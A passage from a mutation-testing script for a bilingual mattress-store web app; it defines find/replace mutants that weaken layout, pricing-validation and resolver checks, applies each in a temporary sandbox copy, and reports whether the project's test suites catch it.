  // ONE of them; the sleep-system suite's close-out guards (13-14) are the
  // observer, and each find string matches index.html exactly once.
  // (1) the <=680px rail back to four 112px chips in a sideways scroller -
  //     the geometry whose labels clipped inside their chips.
  ["1.4 close-out: the narrow rail goes back to four 112px scrolling columns",
    "      .sleep-system__rail {\n        grid-template-columns: repeat(2, minmax(0, 1fr));\n      }",
    "      .sleep-system__rail {\n        grid-template-columns: repeat(4, minmax(112px, 1fr));\n        overflow-x: auto;\n        padding-bottom: 4px;\n      }",
    SLEEP],
  // (2) the two-column rail regains a horizontal scroller on its own.
  ["1.4 close-out: the narrow rail regains overflow-x: auto",
    "        grid-template-columns: repeat(2, minmax(0, 1fr));\n      }\n      .sleep-system__section-head {",
    "        grid-template-columns: repeat(2, minmax(0, 1fr));\n        overflow-x: auto;\n      }\n      .sleep-system__section-head {",
    SLEEP],
  // (3) the procedure notes back under the 15px floor.
  ["1.4 close-out: the procedure notes shrink back to 11px",
    "      font: 600 15px/1.4 var(--font-sans);",
    "      font: 600 11px/1.4 var(--font-sans);",
    SLEEP],
  // (4) the chip status back to 10px.
  ["1.4 close-out: the rail chip status shrinks back to 10px",
    "      font: 500 12px/1.2 var(--font-sans);\n      overflow-wrap: anywhere;",
    "      font: 500 10px/1.2 var(--font-sans);\n      overflow-wrap: anywhere;",
    SLEEP],
  // (5) the chip status may no longer wrap - a long product name overflows.
  ["1.4 close-out: the rail chip status loses overflow-wrap: anywhere",
    "      font: 500 12px/1.2 var(--font-sans);\n      overflow-wrap: anywhere;\n",
    "      font: 500 12px/1.2 var(--font-sans);\n",
    SLEEP],
  // (6) the two-label eyebrow returns: adjustability and support are named
  //     "During the trial" again instead of "Specialist notes".
  ["1.4 close-out: the procedure eyebrow goes back to the two-label form",
    "      var guidanceKind = sleepSystemText({ en: 'Specialist notes', es: 'Notas del especialista' });",
    "      var guidanceKind = step.id === 'pillow' || step.id === 'protection'\n        ? sleepSystemText({ en: 'Specialist notes', es: 'Notas del especialista' })\n        : sleepSystemText({ en: 'During the trial', es: 'Durante la prueba' });",
    SLEEP],
  // (7) one approved note back in customer voice (the side-sleeper cue).
  ["1.4 close-out: the side-sleeper pillow cue reverts to customer voice",
    "          side: { en: 'Check that the customer\\'s head fills the shoulder-to-mattress gap.', es: 'Verifica que la cabeza del cliente llene el espacio entre el hombro y el colch\u00f3n.' },",
    "          side: { en: 'Your head should fill the shoulder-to-mattress gap.', es: 'Tu cabeza debe llenar el espacio entre el hombro y el colch\u00f3n.' },",
    SLEEP],
  // (8) an ES counterpart goes English-only (the support step's third note).
  ["1.4 close-out: a reworded note's ES value is replaced by its EN value",
    "es: 'Verifica la configuraci\u00f3n final antes de que el cliente haga su selecci\u00f3n.'",
    "es: 'Verify the final setup before the customer makes a selection.'",
    SLEEP],
  // (9) a new, narrower breakpoint is added - the "no breakpoint added" pin
  //     counts @media max-width blocks against the da4f746 count.
  ["1.4 close-out: a new @media (max-width: 600px) block is added",
    "    @media (prefers-reduced-motion: reduce) {\n      .sleep-system__main { animation: none; }",
    "    @media (max-width: 600px) {\n      .sleep-system__rail { gap: 6px; }\n    }\n    @media (prefers-reduced-motion: reduce) {\n      .sleep-system__main { animation: none; }",
    SLEEP],
  // (10)/(11) review correction (owner ruling 2026-08-25): the per-alternative
  //     "Add" control's 44px touch floor. The padding line anchors both finds
  //     to THIS rule - the .sleep-system__action rule also declares
  //     min-height: 44px but pads 9px 13px, so neither find can drift onto it.
  ["1.4 close-out: the alternative Add control sinks back under the 44px height floor",
    "      min-height: 44px;\n      padding: 8px 11px;",
    "      min-height: 40px;\n      padding: 8px 11px;",
    SLEEP],
  ["1.4 close-out: the alternative Add control loses its 44px width floor",
    "      min-width: 44px;\n      min-height: 44px;\n      padding: 8px 11px;",
    "      min-height: 44px;\n      padding: 8px 11px;",
    SLEEP],

  // --- Phase 2.1a: the dark pricing framework's admission gate ---------------
  // Focused on the critical properties (Codex review 2026-08-27, correction
  // 10): the 2.2 display lock, the never-infer-a-size rule, freshness while
  // enabled, integer-minor-unit money, closed-world keys, and the shipped
  // dark state itself. Each find string is proven to match its target exactly
  // once by tests/pricing_contract_check.py.
  ["2.1a: the validator stops refusing displayEnabled=true (the Phase 2.2 lock is gone)",
    "    if display is True:\n        r.add_error(\"pricing.displayEnabled must be false",
    "    if False:\n        r.add_error(\"pricing.displayEnabled must be false",
    PRICING_VALIDATOR, "tools/validation.py"],
  ["2.1a: a mattress price without a verified size is admitted (a size could be inferred)",
    "                elif type(size) is not str or size not in size_set:",
    "                elif False:",
    PRICING_VALIDATOR, "tools/validation.py"],
  ["2.1a: stale price evidence is admitted while the framework is enabled",
    "        if enabled:\n            r.add_error(msg)\n        else:\n            r.add_warning(msg)",
    "        if False:\n            r.add_error(msg)\n        else:\n            r.add_warning(msg)",
    PRICING_VALIDATOR, "tools/validation.py"],
  ["2.1a: a float amount is admitted as money (minor-unit integers no longer required)",
    "                if type(amt) is not int or amt <= 0 or amt > PRICING_AMOUNT_MINOR_MAX:\n                    r.add_error(f\"{tag}.price.amountMinor",
    "                if not isinstance(amt, (int, float)) or amt <= 0 or amt > PRICING_AMOUNT_MINOR_MAX:\n                    r.add_error(f\"{tag}.price.amountMinor",
    PRICING_VALIDATOR, "tools/validation.py"],
  ["2.1a: unknown keys are accepted at every nested pricing level",
    "    for k in obj:\n        if k not in allowed:\n            r.add_error(f\"{tag}: key",
    "    for k in ():\n        if k not in allowed:\n            r.add_error(f\"{tag}: key",
    PRICING_VALIDATOR, "tools/validation.py"],
  ["2.1a: the generated production config ships displayEnabled=true",
    "    \"enabled\": false,\n    \"displayEnabled\": false,",
    "    \"enabled\": false,\n    \"displayEnabled\": true,",
    PRICING, "data/store-config.json"],
  // PR #69 review (Codex, 2026-08-27): one entry per requested contract change.
  ["2.1a review: a transaction amount is admitted as configuration (the forbidden key is gone)",
    "    \"transactionamountminor\", \"transactionamount\", \"purchaseamountminor\",",
    "    \"transactionamount\", \"purchaseamountminor\",",
    PRICING_VALIDATOR, "tools/validation.py"],
  // Gate split (owner ruling 2026-08-28): the exact-term entry is RETIRED with
  // its check — the flag gates live exact-term OUTPUT only (the policy suite
  // pins that) and no longer gates validation. Its replacement guards the
  // financing-enabled leg of the same cross-gate.
  ["2.1b: a formula is admitted while financing itself is disabled",
    "        if not fin_enabled:\n            r.add_error(\"pricing.formulas: financing must be enabled — a formula \"",
    "        if False:\n            r.add_error(\"pricing.formulas: financing must be enabled — a formula \"",
    PRICING_VALIDATOR, "tools/validation.py"],
  ["2.1a review: one entry's clearance clears another (the scope match is gone)",
    "                            elif scope[key] != expected[key] or type(scope[key]) is not type(expected[key]):",
    "                            elif False:",
    PRICING_VALIDATOR, "tools/validation.py"],
  ["2.1b: the activation gate on presentation approval is gone (approvals silently DROPPED, not moved)",
    "        if activation and not papproved:\n            r.add_error(\"pricing.presentation.status must be 'approved' at activation \"",
    "        if False and not papproved:\n            r.add_error(\"pricing.presentation.status must be 'approved' at activation \"",
    PRICING_VALIDATOR, "tools/validation.py"],
  ["2.1a review: an enabled contract no longer needs an approved freshness policy",
    "        if enabled and not approved:\n            r.add_error(\"pricing.freshness.status must be 'approved' (with maxAgeDays, \"",
    "        if False:\n            r.add_error(\"pricing.freshness.status must be 'approved' (with maxAgeDays, \"",
    PRICING_VALIDATOR, "tools/validation.py"],
  // Clearance-integrity correction (Codex, 2026-08-27): the scope binds size.
  ["2.1a review: a clearance survives a size change (the size scope comparison is gone)",
    "                            \"size\": size if kind == \"mattress\" else None,",
    "                            \"size\": scope.get(\"size\"),",
    PRICING_VALIDATOR, "tools/validation.py"],

  // --- Phase 2.1b: the dark resolver (index.html) --------------------------
  // Each entry mutates the REAL resolver source; the resolver suite executes
  // the mutated function and the specific five-axis probe fails. Find strings
  // are proven to match exactly once by tests/pricing_contract_check.py.
  ["2.1b: the eligibility axis is forced eligible (activation approvals become decorative)",
    "        eligible = p.displayEnabled === true",
    "        eligible = true || p.displayEnabled === true",
    PRICING_RESOLVER, "index.html"],
  ["2.1b: stale strips the numeric (stale conflated with technical invalidity)",
    "          freshness = (now - evInstant) > mad * 86400000 ? 'stale' : 'fresh';",
    "          freshness = (now - evInstant) > mad * 86400000 ? 'stale' : 'fresh';\n          if (freshness === 'stale') { priceValid = false; amountMinor = null; }",
    PRICING_RESOLVER, "index.html"],
  ["2.1b: stale reports fresh (the cadence axis stops firing)",
    "          freshness = (now - evInstant) > mad * 86400000 ? 'stale' : 'fresh';",
    "          freshness = (now - evInstant) > mad * 86400000 ? 'fresh' : 'fresh';",
    PRICING_RESOLVER, "index.html"],
  ["2.1b: the threshold reads a constant instead of the runtime transaction amount",
    "      var txn = q.transactionAmountMinor;",
    "      var txn = 250000;",
    PRICING_RESOLVER, "index.html"],
  ["2.1b: the exact minor-unit conversion is dropped ($499 meets a $500 minimum)",
    "          threshold = txn >= minMinor ? 'met' : 'not-met';",
    "          threshold = txn >= plan.minimumPurchase ? 'met' : 'not-met';",
    PRICING_RESOLVER, "index.html"],
  // Codex exact-head review of PR #71 (2026-08-28): one entry per finding.
  ["2.1b review: the SKU identity check is gone (a price resolves without its SKU)",
    "          if (!isStr(q.sku) || !nonBlank(q.sku) || e.sku !== q.sku) continue;",
    "          if (false) continue;",
    PRICING_RESOLVER, "index.html"],
  ["2.1b review: the window-start check is gone (a price resolves before it starts)",
    "if (startAt !== null && now < startAt) winOk = false;",
    "if (false && startAt !== null && now < startAt) winOk = false;",
    PRICING_RESOLVER, "index.html"],
  ["2.1b review: the malformed-start-bound check is gone (an unparseable start is ignored)",
    "if (startRaw !== null && startRaw !== undefined && startAt === null) winOk = false;",
    "if (false) winOk = false;",
    PRICING_RESOLVER, "index.html"],
  ["2.1b review: the financing-envelope gate is forced open (a stale envelope still governs)",
    "        finValid = finAt !== null && finAt <= now + SKEW_MS\n          && (now - finAt) <= finMad * 86400000\n          && allowedHost(fin.sourceUrl, fin.allowedSourceHosts);",
    "        finValid = true;",
    PRICING_RESOLVER, "index.html"],
  ["2.1b: quote-only is conflated with calculation-unavailable",
    "        calculation = 'quote-only';",
    "        calculation = 'unavailable';",
    PRICING_RESOLVER, "index.html"],
  ["2.1b: resolver data enters the GAS email payload",
    "      const payload = {\n        storeName: (STORE_CONFIG && STORE_CONFIG.storeName) || '',",
    "      const payload = {\n        pricingAmountMinor: 369900,\n        storeName: (STORE_CONFIG && STORE_CONFIG.storeName) || '',",
    PAY_EMAIL, "index.html"],
  ["2.1b: a resolved amount reaches the one live price surface",
    "        var price = Number(primary.price) > 0\n          ? sleepSystemText({ en: 'From $', es: 'Desde $' }) + Number(primary.price).toLocaleString()",
    "        var price = Number(primary.price) > 0\n          ? sleepSystemText({ en: 'From $', es: 'Desde $' }) + Number(primary.price).toLocaleString() + ' ($3,699)'",
    SLEEP, "index.html"],

  // 3.7 P2 (owner ruling 2026-08-30): the hero badge keys on an answer-derived
  // match. Re-keying it on the relative threshold re-badges the gel pillow
  // (best on its catalog default alone) as "Recommended to try" for a back
  // sleeper - observed by the rendered P2 section of the presentation suite.
  ["sleep system: the hero badge keys on meetsMatchThreshold instead of matched (P2 reverted)",
    "          : (primary.matched\n            ? sleepSystemText({ en: 'Recommended to try', es: 'Recomendado para probar' })",
    "          : (primary.meetsMatchThreshold\n            ? sleepSystemText({ en: 'Recommended to try', es: 'Recomendado para probar' })", SLEEP],

  // 3.7 P3 (owner ruling 2026-08-30): the matched-first pillow rank inside
  // readSleepSystemGroups(). Neutralising the comparator restores the pre-P3
  // order (gel default 2 ahead of the matched Flow for back sleepers) -
  // observed by the fixture (s1 / s5) and the rendered P3 section.
  ["sleep system: the matched-first pillow rank is neutralised (P3 reverted)",
    "        return (b.matched ? 1 : 0) - (a.matched ? 1 : 0);",
    "        return 0;", ["tests/phase1_output_regression_check.mjs"].concat(SLEEP)],

  // 3.7 P1 (owner ruling 2026-08-30): heat parity in the accessory scorer and
  // the protection-goal chooser. Each reverted alone must be observed - the
  // scorer by the fixture (s11) and the rendered P1 section, the goal chooser
  // by the rendered P1 section.
  ["sleep system: the accessory scorer reads only the temperature answer again (P1 reverted)",
    "      const hotSleeper = temp === 'hot' || issues.includes('hot');",
    "      const hotSleeper = temp === 'hot';", ["tests/phase1_output_regression_check.mjs"].concat(SLEEP)],
  ["sleep system: the protection goal reads only the temperature answer again (P1 reverted)",
    "      if (answers.temperature === 'hot' || issues.includes('hot')) return 'cooling';",
    "      if (answers.temperature === 'hot') return 'cooling';", SLEEP],
  // 3.7 P9 Option C (owner ruling 2026-08-30): the reaction handler offers the
  // other cataloged pillow (no product ids); the "Lower height" choice and
  // the height note follow the catalog. Observed by the rendered P9 section.
  ["sleep system: the pillow reaction re-offers the current pillow (the other-pillow rule is dropped)",
    "          window._sleepSystemState.pillowCandidateId = otherPillow ? otherPillow.id : currentPillowId;",
    "          window._sleepSystemState.pillowCandidateId = currentPillowId;", SLEEP],
  ["sleep system: the \"Lower height\" choice is offered regardless of the catalog",
    "      if (!catalogHasLowProfileSupport()) {\n        choices = choices.filter(function(choice) { return choice.id !== 'low'; });\n      }",
    "", SLEEP],
  ["sleep system: the support height note ignores the catalog (comparison note always shown)",
    "          catalogHasLowProfileSupport()\n            ? sleepSystemText({ en: 'Compare standard and lower bed heights.', es: 'Compara alturas estándar y más bajas.' })",
    "          true\n            ? sleepSystemText({ en: 'Compare standard and lower bed heights.', es: 'Compara alturas estándar y más bajas.' })", SLEEP],

  // 3.7 P5 option C (owner ruling 2026-08-30): the neutral no-trigger base
  // presentation. Observed by the rendered P5 section.
  ["sleep system: the unjustified base hero returns for no-trigger customers (P5 assembly reverted)",
    "          (supportOutcome || (adjustabilityNoTrigger ? basesCompareHtml : productHtml));",
    "          (supportOutcome || productHtml);", SLEEP],
  ["sleep system: the neutral compare list drops to the engine's back-filled group (all-bases rule removed)",
    "          var allBases = (Array.isArray(ACCESSORIES) ? ACCESSORIES : []).filter(function(item) {\n            return sleepSystemStepForItem(item) === 'adjustability';\n          });",
    "          var allBases = items.slice(0, 2);", SLEEP],
  ["sleep system: the neutral row action loses its plan wording (Add to plan -> Add)",
    "sleepSystemText({ en: 'Add to plan', es: 'Agregar al plan' })) +\n                  '</button>' +\n                '</div>';\n              }).join('')",
    "sleepSystemText({ en: 'Add', es: 'Agregar' })) +\n                  '</button>' +\n                '</div>';\n              }).join('')", SLEEP],

];

// ---------------------------------------------------------------------------
if (process.argv.includes("--list")) {
  MUTATIONS.forEach(([label], i) => console.log(`${String(i + 1).padStart(2)}. ${label}`));
  console.log(`\n${MUTATIONS.length} mutations; default suites: ${DEFAULT_SUITES.join(", ")}`);
  process.exit(0);
}

const sandbox = mkdtempSync(join(tmpdir(), "df-mutsweep-"));
process.on("exit", () => { try { rmSync(sandbox, { recursive: true, force: true }); } catch {} });
// `demo` joins the copy set so a mutation of the GENERATED demo bundle is
// observable: the financing copy propagation chain ends there, and a drifted
// demo would otherwise be unreachable from this sandbox.
// `.github` joins the copy set because the pricing contract suite pins that
// CI's operating-state lock names pricing.displayEnabled.
for (const d of ["tests", "data", "docs", "tools", "incoming", "demo", ".github"]) {
  cpSync(join(root, d), join(sandbox, d), { recursive: true });
}
// CLAUDE.md joins the copy set because the trust suite pins that it carries no
// paragraph legitimizing retailer prose in the quiz contract.
for (const f of ["index.html", "Code.gs", "CLAUDE.md"]) cpSync(join(root, f), join(sandbox, f));

// Per-target pristine sources. Entries name their target with a fifth field;
// index.html is the default. Every mutated target is restored before the next
// entry runs, so one entry's mutation can never contaminate another's.
const PRISTINE = readFileSync(join(sandbox, "index.html"), "utf8");
const PRISTINE_BY_FILE = {
  "index.html": PRISTINE,
  "Code.gs": readFileSync(join(sandbox, "Code.gs"), "utf8"),
  "data/dict-es.json": readFileSync(join(sandbox, "data", "dict-es.json"), "utf8"),
  "data/dict-en.json": readFileSync(join(sandbox, "data", "dict-en.json"), "utf8"),
  // The financing copy propagation chain: authored source, generated
  // production config, generated demo bundle. Mutating each in turn proves the
  // chain is actually compared rather than assumed.
  "incoming/lacks_financing.json":
    readFileSync(join(sandbox, "incoming", "lacks_financing.json"), "utf8"),
  "data/store-config.json":
    readFileSync(join(sandbox, "data", "store-config.json"), "utf8"),
  "demo/black-friday/data/store-config.json":
    readFileSync(join(sandbox, "demo", "black-friday", "data", "store-config.json"), "utf8"),
  // The build-time gate itself. index.html decides what a customer sees given
  // a config; the validator decides which configs may exist at all, and a hole
  // there is invisible to every runtime suite — which is precisely how the
  // `experience` bypass shipped green.
  "tools/validation.py":
    readFileSync(join(sandbox, "tools", "validation.py"), "utf8"),
  // Trust gate: the generated quiz copy and the correspondence document that
  // governs it. Mutating each proves the suite compares them rather than
  // trusting either.
  "data/quiz.json": readFileSync(join(sandbox, "data", "quiz.json"), "utf8"),
  "docs/quiz-copy-engine-correspondence.md":
    readFileSync(join(sandbox, "docs", "quiz-copy-engine-correspondence.md"), "utf8"),
};

// Observers are node suites by default. The validator's self-test is the one
// PYTHON observer, and the fact that it lives inside the very file it
// validates is what makes it the correct observer for a validator mutation:
// restore the bypass in the implementation half and the assertion half goes
// red in the same process, with no cross-file wiring to get stale. Entries may
// carry arguments, so the string is split rather than passed whole.
function runSuites(suites) {
  const red = [];
  for (const s of suites) {
    const argv = s.split(" ");
    const py = argv[0].endsWith(".py");
    try {
      execFileSync(py ? "python" : "node", argv,
                   { cwd: sandbox, stdio: "pipe", timeout: 180000 });
    } catch {
      red.push(argv[0].replace("tests/", "").replace("tools/", "")
                      .replace("_check.mjs", "").replace(".py", ""));
    }
  }
  return red;
}

function asRegex(find) {
  return new RegExp(find.replace(/[.*+?^${}()|[\]\\]/g, "\\$&").replace(/\r?\n/g, "\\r?\\n"));
}

let survivors = 0, notApplied = 0, caught = 0;
// The baseline runs EVERY suite the manifest can name, derived from the
// manifest itself so a new entry's observer is baselined automatically. A
// suite that is red before any mutation would otherwise mark every mutation
// naming it as "caught" and the sweep could finish green while masking a
// vacuous observer (Codex, PR #16).
const ALL_OBSERVERS = [...new Set(
  MUTATIONS.flatMap((m) => m[3] || DEFAULT_SUITES).concat(WITH_SESSION))];
const baseline = runSuites(ALL_OBSERVERS);
console.log(`baseline (unmutated): ${baseline.length ? "RED — " + baseline.join(",") : "green"}\n`);
if (baseline.length) {
  console.log("::error:: the sweep cannot mean anything while the suites are red unmutated");
  process.exit(1);
}

for (const [label, find, replace, suites, targetFile] of MUTATIONS) {
  const target = targetFile || "index.html";
  const clean = PRISTINE_BY_FILE[target];
  const mutated = clean.replace(asRegex(find), replace);
  if (mutated === clean) {
    console.log(`  [NOT APPLIED] ${label}`);
    notApplied++;
    continue;
  }
  writeFileSync(join(sandbox, target), mutated);
  const red = runSuites(suites || DEFAULT_SUITES);
  writeFileSync(join(sandbox, target), clean);
  if (red.length === 0) {
    console.log(`  [SURVIVED]    ${label}`);
    survivors++;
  } else {
    console.log(`  [caught by ${red.join(",")}] ${label}`);
    caught++;
  }
}

console.log(`\nMutation sweep: ${caught}/${MUTATIONS.length} caught, ${survivors} survived, ${notApplied} did not apply`);
if (survivors) console.log("A SURVIVOR is a safety property with no effective test.");
if (notApplied) console.log("A mutation that DID NOT APPLY is a stale manifest entry — its target moved or was renamed.");
process.exit(survivors === 0 && notApplied === 0 ? 0 : 1);
